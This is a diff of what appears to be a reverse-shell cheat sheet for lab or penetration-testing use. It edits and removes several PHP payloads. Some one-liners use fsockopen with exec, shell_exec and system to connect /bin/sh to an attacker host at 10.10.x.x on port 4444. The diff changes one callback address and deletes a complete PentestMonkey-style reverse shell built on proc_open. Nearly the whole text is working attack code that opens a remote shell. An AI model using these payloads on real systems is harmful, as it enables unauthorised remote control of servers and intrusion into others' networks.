@@ -206,7 +206,7 @@ $client.Close()
 
 **PHP exec**
 ```php
-php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.16.122",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 **PHP shell_exec**
@@ -217,23 +217,6 @@ php -r '$sock=fsockopen("10.10.14.5",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3")
 **PHP system**
 ```php
 php -r '$sock=fsockopen("10.10.14.5",4444);system("/bin/sh -i <&3 >&3 2>&3");'
-```
-
-**PHP PentestMonkey (complet)**
-```php
-<?php
-set_time_limit(0);
-$ip = '10.10.14.5';
-$port = 4444;
-$sock = fsockopen($ip, $port);
-$descriptors = array(
-   0 => $sock,
-   1 => $sock,
-   2 => $sock
-);
-$process = proc_open('/bin/sh', $descriptors, $pipes);
-proc_close($process);
-?>
 ```
 
 ---
